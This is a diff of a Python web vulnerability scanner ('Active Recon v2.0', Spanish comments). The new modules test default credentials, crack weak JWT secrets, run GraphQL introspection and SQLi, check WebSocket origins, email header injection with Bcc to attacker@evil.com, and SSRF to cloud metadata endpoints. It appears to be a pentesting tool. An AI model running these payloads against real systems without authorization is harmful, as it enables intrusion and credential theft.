-            ct = resp.headers.get("content-type", "")
-            if "json" in ct or "yaml" in ct or "swagger" in resp.text.lower()[:200]:
-                found_apis.append({
-                    "path": f"/{sp}",
-                    "status": 200,
-                    "content_type": ct,
-                    "is_api": True,
-                    "swagger": True,
-                })
-                log_vuln("MEDIUM", f"Swagger/OpenAPI expuesto: /{sp}")
-
-    # GraphQL check
-    gql_paths = ["graphql", "graphiql", "api/graphql", "v1/graphql"]
-    for gp in gql_paths:
-        resp = safe_request(session, "POST", f"{base_url}/{gp}", rate_limiter,
-                           json={"query": "{__schema{types{name}}}"})
-        if resp and resp.status_code == 200:
-            try:
-                data = resp.json()
-                if "data" in data or "__schema" in str(data):
-                    found_apis.append({
-                        "path": f"/{gp}",
-                        "status": 200,
-                        "content_type": "graphql",
-                        "is_api": True,
-                        "introspection": True,
-                    })
-                    log_vuln("MEDIUM", f"GraphQL introspection habilitado: /{gp}")
-            except Exception:
-                pass
-
-    results["api_discovery"] = found_apis
-    log_info(f"Endpoints encontrados: {len(found_apis)}")
-
-
-# =====================================================================
-#  MODULE 24: VULNERABILITY ASSESSMENT
-# =====================================================================
-def mod_vuln_assessment(results):
-    """Evaluacion agregada de vulnerabilidades."""
-    section_header("VULNERABILITY ASSESSMENT")
-
-    vulns = []
-
-    # --- Port Scan ---
-    open_ports = results.get("open_ports", [])
-    risky_ports = {21: "FTP", 23: "Telnet", 445: "SMB", 3389: "RDP",
-                   1433: "MSSQL", 3306: "MySQL", 5432: "PostgreSQL",
-                   27017: "MongoDB", 6379: "Redis", 11211: "Memcached",
-                   9200: "Elasticsearch", 2181: "ZooKeeper", 5900: "VNC"}
-    for port in open_ports:
-        if port in risky_ports:
-            vulns.append(("HIGH", f"Puerto riesgoso expuesto: {port} ({risky_ports[port]})",
-                f"Puerto {port}/{risky_ports[port]} abierto a internet.",
-                "Restringir acceso con firewall. No exponer servicios internos."))
-    if len(open_ports) > 20:
-        vulns.append(("MEDIUM", "Excesivos puertos abiertos",
-            f"{len(open_ports)} puertos abiertos. Superficie de ataque amplia.",
-            "Cerrar puertos innecesarios. Aplicar principio de minimo privilegio."))
-
-    # --- Services ---
-    services = results.get("services", [])
-    for svc in services:
-        banner = svc.get("banner", "").lower()
-        if any(v in banner for v in ["apache/2.2", "apache/2.0", "nginx/0.", "nginx/1.0"]):
-            vulns.append(("HIGH", f"Version obsoleta en puerto {svc['port']}",
-                f"Servicio desactualizado: {svc['service']}",
-                "Actualizar a la ultima version estable."))
-        if svc["port"] == 21 and "anonymous" in banner:
-            vulns.append(("HIGH", "FTP Anonymous Login Permitted",
-                "FTP permite login anonimo.",
-                "Deshabilitar FTP anonimo."))
-
-    # --- Directories ---
-    dirs = results.get("directories", [])
-    sensitive_dirs = [".git", ".env", ".svn", "backup", "config", "phpinfo",
-                      "phpmyadmin", "adminer", "server-status", "server-info",
-                      "actuator", "debug", "trace.axd", "elmah.axd", "wp-config"]
-    for d in dirs:
-        path_lower = d["url"].lower()
-        for sd in sensitive_dirs:
-            if sd in path_lower and d["status"] == 200:
-                vulns.append(("HIGH", f"Recurso sensible expuesto: {sd}",
-                    f"{d['url']} [{d['status']}] ({d['size']} bytes)",
-                    f"Bloquear acceso a {sd} en produccion."))
+            if any(s in body for s in success_indicators) and not any(f in body for f in fail_indicators):
+                log_vuln("CRITICAL", f"Default creds: /{path} -> {user}:{pwd}")
+                findings.append({"path": path, "username": user, "password": pwd,
+                               "severity": "CRITICAL"})
                 break
 
-    # --- DNS Zone Transfer ---
-    zt = results.get("zone_transfer", [])
-    for z in zt:
-        if z.get("success"):
-            vulns.append(("HIGH", "DNS Zone Transfer Exitoso",
-                f"Nameserver {z['nameserver']} permite AXFR. {len(z.get('records', []))} records expuestos.",
-                "Deshabilitar zone transfer a hosts no autorizados."))
+            # Check for redirect to dashboard
+            if r.status_code in (301, 302, 303, 307):
+                loc = r.headers.get("Location", "").lower()
+                if any(s in loc for s in ["dashboard","admin","panel","home","index"]):
+                    log_vuln("CRITICAL", f"Default creds (redirect): /{path} -> {user}:{pwd}")
+                    findings.append({"path": path, "username": user, "password": pwd,
+                                   "severity": "CRITICAL"})
+                    break
 
-    # --- SSL/TLS ---
-    ssl_data = results.get("ssl_audit", {})
-    for issue in ssl_data.get("issues", []):
-        if "expired" in issue.lower():
-            vulns.append(("CRITICAL", "Certificado SSL Expirado", issue, "Renovar certificado."))
-        elif "self-signed" in issue.lower():
-            vulns.append(("MEDIUM", "Certificado Auto-Firmado", issue, "Usar certificado de CA confiable."))
-        elif "null" in issue.lower():
-            vulns.append(("CRITICAL", "NULL Cipher", issue, "Deshabilitar NULL cipher."))
-        elif "export" in issue.lower():
-            vulns.append(("CRITICAL", "EXPORT Cipher", issue, "Deshabilitar EXPORT ciphers."))
-        elif "rc4" in issue.lower() or "des" in issue.lower():
-            vulns.append(("HIGH", "Cipher Debil", issue, "Usar ciphers modernos (AES-GCM)."))
-        elif "tls" in issue.lower() and "deprecated" in issue.lower():
-            vulns.append(("HIGH", "Protocolo TLS Deprecated", issue, "Deshabilitar TLS 1.0/1.1."))
+    ctx["results"]["default_creds"] = findings
 
-    # --- CORS ---
-    cors = results.get("cors_active", [])
-    for c in cors:
-        acac = c.get("acac", "").lower()
-        acao = c.get("acao", "")
-        if acao == "*" and acac == "true":
-            vulns.append(("CRITICAL", "CORS: Wildcard + Credentials",
-                "Cualquier sitio puede leer respuestas autenticadas.",
-                "Validar origin contra whitelist. No usar * con credentials."))
-        elif acao == "null":
-            vulns.append(("HIGH", "CORS: Null Origin Permitido",
-                "Origin null aceptado. Bypass via iframes sandboxed.",
-                "No permitir null origin."))
-        elif "evil.com" in acao:
-            vulns.append(("HIGH", f"CORS: Origin Reflejado ({c.get('description', '')})",
-                f"Server refleja origin: {acao}",
-                "Validar origin contra whitelist."))
 
-    # --- HTTP Methods ---
-    methods = results.get("http_methods", {})
-    for d in methods.get("dangerous", []):
-        if d == "TRACE":
-            vulns.append(("MEDIUM", "TRACE Method Enabled",
-                "TRACE permite Cross-Site Tracing attacks.",
-                "Deshabilitar TRACE en el servidor."))
-        elif d in ("PUT", "DELETE"):
-            vulns.append(("HIGH", f"{d} Method Enabled",
-                f"Metodo {d} permite modificacion de recursos.",
-                f"Deshabilitar {d} si no es necesario."))
+# =====================================================================
+#  MODULE 38: JWT ANALYSIS
+# =====================================================================
+def mod_jwt_analysis(ctx):
+    section_header("JWT ANALYSIS")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
 
-    # --- SQLi ---
-    sqli = results.get("sqli", [])
-    for s in sqli:
-        vulns.append(("CRITICAL", f"SQL Injection: {s['type']}",
-            f"Param: {s['param']} en {s['url'][:60]}",
-            "Usar prepared statements. Validar y sanitizar input."))
-
-    # --- XSS ---
-    xss = results.get("xss", [])
-    for x in xss:
-        vulns.append(("HIGH", f"XSS: {x['type']}",
-            f"Param: {x['param']} en {x['url'][:60]}",
-            "Escapar output. Implementar CSP. Validar input."))
-
-    # --- LFI ---
-    lfi = results.get("lfi", [])
-    for l in lfi:
-        vulns.append(("CRITICAL", "Local File Inclusion",
-            f"Param: {l['param']} en {l['url'][:60]}",
-            "No usar input de usuario en funciones de inclusion de archivos."))
-
-    # --- Open Redirect ---
-    redirects = results.get("open_redirect", [])
-    for r in redirects:
-        vulns.append(("MEDIUM", "Open Redirect",
-            f"Param: {r['param']} redirige a {r.get('redirect_to', '')[:60]}",
-            "Validar URLs de redireccion contra whitelist."))
-
-    # --- CRLF ---
-    crlf = results.get("crlf", [])
-    for cr in crlf:
-        sev = "CRITICAL" if "XSS" in cr.get("type", "") else "HIGH"
-        vulns.append((sev, f"CRLF Injection: {cr['type']}",
-            f"En {cr.get('url', '')[:60]}",
-            "Sanitizar \\r\\n en input. Usar frameworks que previenen CRLF."))
-
-    # --- Host Header ---
-    hh = results.get("host_header", [])
-    for h in hh:
-        vulns.append(("HIGH", f"Host Header Injection: {h.get('type', '')}",
-            f"Host value reflejado en respuesta.",
-            "Configurar virtual hosts. Ignorar Host header arbitrario."))
-
-    # --- Subdomain Takeover ---
-    takeover = results.get("takeover", [])
-    for t in takeover:
-        vulns.append(("CRITICAL", "Subdomain Takeover",
-            f"{t['subdomain']} -> {t.get('cname', '')} ({t.get('service', '')})",
-            "Reclamar recurso en servicio o eliminar DNS record."))
-
-    # --- Default Creds ---
-    creds = results.get("default_creds", [])
-    for c in creds:
-        vulns.append(("CRITICAL", f"Default Credentials: {c.get('service', '')}",
-            f"{c['username']}:{c['password']} en {c.get('url', '')[:60]}",
-            "Cambiar credenciales por defecto inmediatamente."))
-
-    # --- WAF ---
-    waf = results.get("waf_active", [])
-    if not waf:
-        vulns.append(("INFO", "No WAF Detected",
-            "No se detecto Web Application Firewall.",
-            "Considerar implementar WAF (Cloudflare, AWS WAF, etc)."))
-
-    # --- CMS ---
-    cms = results.get("cms_active", {})
-    if cms.get("cms"):
-        details = cms.get("details", [])
-        for d in details:
-            if "XMLRPC: enabled" in d:
-                vulns.append(("MEDIUM", "WordPress XMLRPC Enabled",
-                    "xmlrpc.php habilitado. Vector de bruteforce y SSRF.",
-                    "Deshabilitar xmlrpc.php o restringir acceso."))
-            if "User:" in d or "User (enum):" in d:
-                vulns.append(("LOW", "CMS User Enumeration",
-                    f"Usuario encontrado: {d}",
-                    "Deshabilitar enumeracion de usuarios."))
-
-    # --- API ---
-    apis = results.get("api_discovery", [])
-    for a in apis:
-        if a.get("swagger"):
-            vulns.append(("MEDIUM", "Swagger/OpenAPI Documentation Exposed",
-                f"API docs accesibles en {a['path']}",
-                "Restringir acceso a documentacion API en produccion."))
-        if a.get("introspection"):
-            vulns.append(("MEDIUM", "GraphQL Introspection Enabled",
-                f"GraphQL introspection en {a['path']}",
-                "Deshabilitar introspection en produccion."))
-        if a["status"] == 401:
-            vulns.append(("INFO", f"API Endpoint Requires Auth: {a['path']}",
-                f"Endpoint protegido encontrado.",
-                "Verificar que autenticacion sea robusta."))
-
-    # --- Crawl ---
-    crawl = results.get("crawl", {})
-    forms = crawl.get("forms", [])
-    for form in forms:
-        action = form.get("action", "")
-        if action.startswith("http://"):
-            vulns.append(("HIGH", "Form Submits Over HTTP",
-                f"Form action: {action[:60]}",
-                "Cambiar form action a HTTPS."))
-        inputs = form.get("inputs", [])
-        has_csrf = any("csrf" in i.get("name", "").lower() or "token" in i.get("name", "").lower() for i in inputs)
-        if form.get("method") == "POST" and not has_csrf:
-            vulns.append(("MEDIUM", "Form POST Without CSRF Token",
-                f"Form en {action[:60]} sin CSRF token visible.",
-                "Implementar CSRF protection en formularios POST."))
-
-    if crawl.get("emails"):
-        vulns.append(("LOW", "Email Addresses Disclosed",
-            f"{len(crawl['emails'])} email(s) encontrado(s) en el sitio.",
-            "Considerar ofuscar emails para evitar spam/phishing."))
-
-    # --- VHosts ---
-    vhosts = results.get("vhosts", [])
-    if vhosts:
-        vulns.append(("INFO", f"Virtual Hosts Encontrados: {len(vhosts)}",
-            ", ".join([v["vhost"] for v in vhosts[:5]]),
-            "Verificar que vhosts no expongan aplicaciones internas."))
-
-    # === Print Results ===
-    if not vulns:
-        log_ok("No se identificaron vulnerabilidades.")
-        results["vulnerabilities"] = []
+    # Search for JWTs in responses
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if not r:
         return
 
-    severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
-    vulns.sort(key=lambda x: severity_order.get(x[0], 5))
+    # JWT regex pattern
+    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
+    all_text = r.text + str(r.headers) + str(r.cookies.get_dict())
+    tokens = re.findall(jwt_pattern, all_text)
 
-    results["vulnerabilities"] = [
-        {"severity": v[0], "title": v[1], "description": v[2], "remediation": v[3]}
-        for v in vulns
+    if not tokens:
+        log_info("No se encontraron JWTs.")
+        return
+
+    for token in set(tokens):
+        log_ok(f"JWT encontrado: {token[:50]}...")
+        try:
+            # Decode header
+            header_b64 = token.split(".")[0]
+            header_b64 += "=" * (4 - len(header_b64) % 4)
+            header = json.loads(base64.urlsafe_b64decode(header_b64))
+            log_info(f"  Header: {json.dumps(header)}")
+
+            # Decode payload
+            payload_b64 = token.split(".")[1]
+            payload_b64 += "=" * (4 - len(payload_b64) % 4)
+            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
+            log_info(f"  Payload: {json.dumps(payload)[:200]}")
+
+            # Check algorithm
+            alg = header.get("alg", "")
+            if alg.lower() == "none":
+                log_vuln("CRITICAL", "JWT usa algoritmo 'none' - sin firma!")
+                findings.append({"token": token[:50], "issue": "alg=none", "severity": "CRITICAL"})
+            elif alg.upper() in ("HS256", "HS384", "HS512"):
+                log_vuln("LOW", f"JWT usa HMAC ({alg}) - verificar secreto debil")
+                findings.append({"token": token[:50], "issue": f"HMAC {alg}", "severity": "LOW"})
+
+                # Try common weak secrets
+                weak_secrets = ["secret","password","123456","key","admin","test",
+                               "jwt_secret","changeme","default","supersecret"]
+                import hmac as hmac_module
+                import hashlib as hl
+                header_payload = ".".join(token.split(".")[:2])
+                sig = token.split(".")[2]
+                for secret in weak_secrets:
+                    computed = base64.urlsafe_b64encode(
+                        hmac_module.new(secret.encode(), header_payload.encode(),
+                                       hl.sha256).digest()
+                    ).rstrip(b"=").decode()
+                    if computed == sig:
+                        log_vuln("CRITICAL", f"JWT secreto debil: '{secret}'")
+                        findings.append({"token": token[:50], "issue": f"weak_secret: {secret}",
+                                       "severity": "CRITICAL"})
+                        break
+
+            # Check expiration
+            exp = payload.get("exp")
+            if exp:
+                if exp < time.time():
+                    log_vuln("LOW", "JWT expirado pero aun aceptado")
+                    findings.append({"token": token[:50], "issue": "expired", "severity": "LOW"})
+
+            # Check for sensitive data
+            sensitive_keys = ["password","secret","ssn","credit_card","api_key","private"]
+            for key in payload:
+                if any(s in key.lower() for s in sensitive_keys):
+                    log_vuln("MEDIUM", f"JWT contiene dato sensible: {key}")
+                    findings.append({"token": token[:50], "issue": f"sensitive_data: {key}",
+                                   "severity": "MEDIUM"})
+
+        except Exception as e:
+            log_fail(f"  Error decodificando JWT: {e}")
+
+    ctx["results"]["jwt"] = findings
+
+
+# =====================================================================
+#  MODULE 39: GRAPHQL TESTING
+# =====================================================================
+def mod_graphql(ctx):
+    section_header("GRAPHQL TESTING")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Find GraphQL endpoints
+    gql_paths = ["graphql","graphiql","graphql/console","api/graphql","gql",
+                 "v1/graphql","v2/graphql","query","altair"]
+    gql_endpoint = None
+
+    for path in gql_paths:
+        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
+                        ctx["mode_config"]["rotate_ua"])
+        if r and r.status_code in (200, 400):
+            ct = r.headers.get("Content-Type", "")
+            if "json" in ct or "graphql" in ct or "graphiql" in r.text.lower():
+                gql_endpoint = f"{base}/{path}"
+                log_ok(f"GraphQL endpoint: /{path}")
+                break
+
+    if not gql_endpoint:
+        log_info("No se encontro endpoint GraphQL.")
+        return
+
+    # Introspection query
+    introspection = '{"query":"{ __schema { types { name fields { name } } } }"}'
+    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
+                    ctx["mode_config"]["rotate_ua"],
+                    data=introspection, headers={"Content-Type": "application/json"})
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            if "data" in data and "__schema" in data["data"]:
+                types = data["data"]["__schema"]["types"]
+                log_vuln("MEDIUM", f"GraphQL introspection habilitada! ({len(types)} types)")
+                findings.append({"issue": "introspection_enabled", "types": len(types),
+                               "severity": "MEDIUM"})
+                # List interesting types
+                for t in types:
+                    name = t.get("name", "")
+                    if not name.startswith("__") and t.get("fields"):
+                        field_names = [f["name"] for f in t["fields"][:10]]
+                        log_info(f"  Type: {name} -> {', '.join(field_names)}")
+        except Exception:
+            pass
+
+    # Test for batching DoS
+    batch_query = json.dumps([{"query": "{ __typename }"} for _ in range(10)])
+    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
+                    ctx["mode_config"]["rotate_ua"],
+                    data=batch_query, headers={"Content-Type": "application/json"})
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            if isinstance(data, list) and len(data) >= 10:
+                log_vuln("LOW", "GraphQL permite batch queries (posible DoS)")
+                findings.append({"issue": "batch_queries", "severity": "LOW"})
+        except Exception:
+            pass
+
+    # SQLi in GraphQL
+    sqli_query = '{"query":"{ user(id: \\"1\\' OR 1=1--\\") { name } }"}'
+    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
+                    ctx["mode_config"]["rotate_ua"],
+                    data=sqli_query, headers={"Content-Type": "application/json"})
+    if r:
+        body = r.text.lower()
+        for error in SQLI_ERRORS:
+            if error in body:
+                log_vuln("CRITICAL", "GraphQL SQLi: errores SQL en respuesta")
+                findings.append({"issue": "sqli_in_graphql", "severity": "CRITICAL"})
+                break
+
+    ctx["results"]["graphql"] = findings
+
+
+# =====================================================================
+#  MODULE 40: WEBSOCKET TESTING
+# =====================================================================
+def mod_websocket(ctx):
+    section_header("WEBSOCKET TESTING")
+    host = ctx["target_host"]
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
+
+    ws_paths = ["/ws", "/websocket", "/socket.io/", "/sockjs/", "/hub",
+                "/realtime", "/live", "/stream", "/events", "/notifications"]
+
+    for path in ws_paths:
+        ctx["rate_limiter"].wait()
+        ws_url = f"{base}{path}"
+        # Try HTTP upgrade request
+        r = safe_request(session, "GET", ws_url, headers={
+            "Upgrade": "websocket",
+            "Connection": "Upgrade",
+            "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
+            "Sec-WebSocket-Version": "13"
+        }, rotate_ua=ctx["mode_config"]["rotate_ua"])
+
+        if r and r.status_code == 101:
+            log_ok(f"WebSocket endpoint: {path}")
+            findings.append({"path": path, "status": 101})
+        elif r and r.status_code == 200:
+            # Socket.IO might respond with 200
+            if "websocket" in r.text.lower() or "socket.io" in r.text.lower():
+                log_ok(f"WebSocket/Socket.IO endpoint: {path}")
+                findings.append({"path": path, "status": 200, "type": "socket.io"})
+
+        # Check for missing origin validation
+        r2 = safe_request(session, "GET", ws_url, headers={
+            "Upgrade": "websocket",
+            "Connection": "Upgrade",
+            "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
+            "Sec-WebSocket-Version": "13",
+            "Origin": "https://evil.com"
+        }, rotate_ua=ctx["mode_config"]["rotate_ua"])
+
+        if r2 and r2.status_code == 101:
+            log_vuln("HIGH", f"WebSocket sin validacion de Origin: {path}")
+            findings.append({"path": path, "issue": "no_origin_check", "severity": "HIGH"})
+
+    ctx["results"]["websocket"] = findings
+
+
+# =====================================================================
+#  MODULE 41: RATE LIMIT TESTING
+# =====================================================================
+def mod_rate_limit_test(ctx):
+    section_header("RATE LIMIT TESTING")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Test login endpoint rate limiting
+    login_paths = ["login", "api/login", "auth/login", "wp-login.php", "admin/login"]
+    for path in login_paths:
+        r = safe_request(session, "GET", f"{ctx['base_url']}/{path}", ctx["rate_limiter"])
+        if not r or r.status_code == 404:
+            continue
+
+        log_info(f"Probando rate limit en /{path}...")
+        blocked = False
+        for i in range(20):
+            r = safe_request(session, "POST", f"{ctx['base_url']}/{path}",
+                           data={"username": "admin", "password": f"wrong{i}"},
+                           rotate_ua=ctx["mode_config"]["rotate_ua"])
+            if not r:
+                break
+            if r.status_code == 429:
+                log_ok(f"Rate limiting activo en /{path} (despues de {i+1} intentos)")
+                findings.append({"path": path, "limited": True, "after": i+1})
+                blocked = True
+                break
+
+        if not blocked:
+            log_vuln("MEDIUM", f"Sin rate limiting en /{path} (20 intentos sin bloqueo)")
+            findings.append({"path": path, "limited": False, "severity": "MEDIUM"})
+        break  # Only test the first login found
+
+    # Test API rate limiting
+    statuses = []
+    for i in range(30):
+        r = safe_request(session, "GET", url, rotate_ua=ctx["mode_config"]["rotate_ua"])
+        if r:
+            statuses.append(r.status_code)
+            if r.status_code == 429:
+                log_ok(f"Rate limiting general activo (despues de {i+1} requests)")
+                findings.append({"type": "general", "limited": True, "after": i+1})
+                break
+
+    if 429 not in statuses:
+        log_info("Sin rate limiting general detectado en 30 requests")
+
+    ctx["results"]["rate_limiting"] = findings
+
+
+# =====================================================================
+#  MODULE 42: INFORMATION DISCLOSURE
+# =====================================================================
+def mod_info_disclosure(ctx):
+    section_header("INFORMATION DISCLOSURE")
+    url = ctx["target_url"]
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Check error pages for info leaks
+    error_urls = [
+        f"{base}/{'a'*200}",  # Long URL
+        f"{base}/..%00/",  # Null byte
+        f"{base}/%00",
+        f"{base}/debug",
+        f"{base}/_debug",
+        f"{base}/trace",
+        f"{base}/error",
     ]
 
-    counts = {}
-    for v in vulns:
-        counts[v[0]] = counts.get(v[0], 0) + 1
+    for err_url in error_urls:
+        r = safe_request(session, "GET", err_url, ctx["rate_limiter"],
+                        ctx["mode_config"]["rotate_ua"])
+        if not r:
+            continue
+        body = r.text.lower()
 
-    severity_colors = {
-        "CRITICAL": C.R + C.BOLD,
-        "HIGH": C.R,
-        "MEDIUM": C.Y,
-        "LOW": C.B,
-        "INFO": C.D,
-    }
+        # Check for stack traces / debug info
+        indicators = [
+            ("Stack trace", ["stack trace", "traceback", "at line", "exception in"]),
+            ("Debug info", ["debug mode", "debug=true", "debug_toolbar"]),
+            ("Server path", ["c:\\", "/var/www/", "/home/", "/usr/", "/opt/"]),
+            ("Framework version", ["django version", "laravel", "rails version"]),
+            ("Database info", ["mysql", "postgresql", "sqlite", "mongodb"]),
+            ("Environment vars", ["database_url", "secret_key", "api_key"]),
+        ]
+        for category, keywords in indicators:
+            for kw in keywords:
+                if kw in body:
+                    log_vuln("MEDIUM", f"Info Disclosure ({category}): {kw} en {err_url[:60]}")
+                    findings.append({"url": err_url[:100], "category": category,
+                                   "keyword": kw, "severity": "MEDIUM"})
+                    break
 
-    print(f"\n  {C.BOLD}Total: {len(vulns)} hallazgos{C.X}")
-    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
-        if sev in counts:
-            color = severity_colors.get(sev, C.W)
-            print(f"  {color}{sev}: {counts[sev]}{C.X}")
-    print()
+    # Check response headers for version info
+    r = safe_request(session, "GET", url, ctx["rate_limiter"])
+    if r:
+        for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime", "X-Generator"]:
+            val = r.headers.get(h, "")
+            if val and any(c.isdigit() for c in val):
+                log_vuln("LOW", f"Version disclosure: {h}: {val}")
+                findings.append({"header": h, "value": val, "severity": "LOW"})
 
-    for sev, title, desc, fix in vulns:
-        color = severity_colors.get(sev, C.W)
-        print(f"  {color}[{sev}]{C.X} {C.BOLD}{title}{C.X}")
-        print(f"      {desc}")
-        print(f"      {C.G}Fix:{C.X} {fix}")
-        print()
+    ctx["results"]["info_disclosure"] = findings
+
+
+# =====================================================================
+#  MODULE 43: EMAIL HEADER INJECTION
+# =====================================================================
+def mod_email_injection(ctx):
+    section_header("EMAIL HEADER INJECTION")
+    base = ctx["base_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Find contact/email forms
+    contact_paths = ["contact", "contact-us", "feedback", "support",
+                     "email", "send", "message", "mail"]
+    email_params = ["email", "to", "from", "subject", "cc", "bcc", "sender", "recipient"]
+    injection_payloads = [
+        "test@test.com%0aBcc:attacker@evil.com",
+        "test@test.com\r\nBcc: attacker@evil.com",
+        "test@test.com%0d%0aBcc: attacker@evil.com",
+        "test@test.com\nCc: attacker@evil.com",
+    ]
+
+    for path in contact_paths:
+        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
+                        ctx["mode_config"]["rotate_ua"])
+        if not r or r.status_code == 404:
+            continue
+
+        for param in email_params:
+            for payload in injection_payloads:
+                r = safe_request(session, "POST", f"{base}/{path}",
+                               ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
+                               data={param: payload, "message": "test", "name": "test"})
+                if r and r.status_code == 200:
+                    body = r.text.lower()
+                    if any(ind in body for ind in ["sent", "success", "thank"]) and \
+                       not any(ind in body for ind in ["invalid", "error", "failed"]):
+                        log_vuln("MEDIUM", f"Posible Email Injection: /{path} param={param}")
+                        findings.append({"path": path, "param": param, "severity": "MEDIUM"})
+                        break
+
+    ctx["results"]["email_injection"] = findings
+
+
+# =====================================================================
+#  MODULE 44: CLOUD METADATA
+# =====================================================================
+def mod_cloud_metadata(ctx):
+    section_header("CLOUD METADATA CHECK")
+    url = ctx["target_url"]
+    session = ctx["session"]
+    findings = []
+
+    # Test through SSRF-like parameters
+    params = ["url", "uri", "redirect", "target", "dest", "path", "src", "proxy",
+              "fetch", "load", "ref", "link", "page"]
+    base = url.split("?")[0]
+
+    metadata_endpoints = [
+        ("AWS", "http://169.254.169.254/latest/meta-data/", ["ami-id","instance"]),
+        ("AWS IMDSv2", "http://169.254.169.254/latest/api/token", ["token"]),
+        ("GCP", "http://metadata.google.internal/computeMetadata/v1/", ["project"]),
+        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute"]),
+        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet"]),
+        ("Oracle", "http://169.254.169.254/opc/v1/instance/", ["instance"]),
+    ]
+
+    for param in params:
+        for cloud, endpoint, indicators in metadata_endpoints:
+            r = safe_request(session, "GET", f"{base}?{param}={quote(endpoint)}",
+                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
+            if not r:
+                continue
+            body = r.text.lower()
+            for ind in indicators:
+                if ind in body:
+                    log_vuln("CRITICAL", f"Cloud Metadata ({cloud}): param={param}")
+                    findings.append({"cloud": cloud, "param": param, "endpoint": endpoint,
+                                   "severity": "CRITICAL"})
+                    break
+
+    ctx["results"]["cloud_metadata"] = findings
 
 
 # =====================================================================
 #  REPORT GENERATOR
 # =====================================================================
-def generate_report(target, results, output_dir, rate_limiter=None):
-    """Genera reporte en texto y JSON."""
-    section_header("REPORT GENERATION")
+def generate_report(ctx):
+    section_header("GENERANDO REPORTE")
+    domain = ctx["domain"]
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    output_dir = ctx.get("output_dir", ".")
 
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    domain = get_domain(target).replace(".", "_")
+    # Contar hallazgos por severidad
+    severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+    all_findings = []
 
-    # Text report
-    txt_file = os.path.join(output_dir, f"active_recon_{domain}_{timestamp}.txt")
+    for module_name, module_results in ctx["results"].items():
+        if isinstance(module_results, list):
+            for item in module_results:
+                if isinstance(item, dict) and "severity" in item:
+                    sev = item["severity"]
+                    severity_count[sev] = severity_count.get(sev, 0) + 1
+                    all_findings.append({**item, "module": module_name})
+        elif isinstance(module_results, dict):
+            for k, v in module_results.items():
+                if isinstance(v, list):
+                    for item in v:
+                        if isinstance(item, dict) and "severity" in item:
+                            sev = item["severity"]
+                            severity_count[sev] = severity_count.get(sev, 0) + 1
+                            all_findings.append({**item, "module": module_name})
+
+    # TXT Report
+    txt_file = os.path.join(output_dir, f"active_recon_{domain}_{ts}.txt")
     with open(txt_file, "w") as f:
-        f.write(f"{'='*60}\n")
-        f.write(f"  ACTIVE RECON REPORT\n")
-        f.write(f"  Target: {target}\n")
+        f.write(f"{'='*70}\n")
+        f.write(f"  ACTIVE RECON REPORT v2.0\n")
+        f.write(f"  Target: {ctx['target_url']}\n")
+        f.write(f"  Domain: {domain}\n")
+        f.write(f"  Mode: {ctx['mode_config']['name']}\n")
         f.write(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-        if rate_limiter:
-            f.write(f"  Total Requests: {rate_limiter.request_count}\n")
-        f.write(f"{'='*60}\n\n")
+        f.write(f"{'='*70}\n\n")
 
-        # Open Ports
-        ports = results.get("open_ports", [])
-        if ports:
-            f.write("OPEN PORTS:\n")
-            for p in ports:
-                svc = next((s for s in results.get("services", []) if s["port"] == p), {})
-                f.write(f"  {p}/tcp - {svc.get('service', 'Unknown')}\n")
-            f.write("\n")
+        f.write("RESUMEN DE HALLAZGOS:\n")
+        f.write(f"  CRITICAL: {severity_count['CRITICAL']}\n")
+        f.write(f"  HIGH:     {severity_count['HIGH']}\n")
+        f.write(f"  MEDIUM:   {severity_count['MEDIUM']}\n")
+        f.write(f"  LOW:      {severity_count['LOW']}\n")
+        f.write(f"  INFO:     {severity_count['INFO']}\n")
+        f.write(f"  Total:    {sum(severity_count.values())}\n\n")
 
-        # Directories
-        dirs = results.get("directories", [])
-        if dirs:
-            f.write("DIRECTORIES/FILES FOUND:\n")
-            for d in dirs:
-                f.write(f"  [{d['status']}] {d['url']} ({d['size']} bytes)\n")
-            f.write("\n")
+        for finding in sorted(all_findings, key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(x.get("severity","INFO"))):
+            f.write(f"[{finding['severity']}] [{finding['module']}] ")
+            f.write(f"{json.dumps({k:v for k,v in finding.items() if k not in ('severity','module')})}\n")
 
-        # Subdomains
-        subs = results.get("subdomains_brute", [])
-        if subs:
-            f.write("SUBDOMAINS:\n")
-            for s in subs:
-                f.write(f"  {s['subdomain']} -> {', '.join(s['ips'])}\n")
-            f.write("\n")
+        f.write(f"\n{'='*70}\n")
+        f.write("RESULTADOS DETALLADOS:\n\n")
 
-        # Technologies
-        techs = results.get("tech_active", [])
-        if techs:
-            f.write("TECHNOLOGIES:\n")
-            for t in techs:
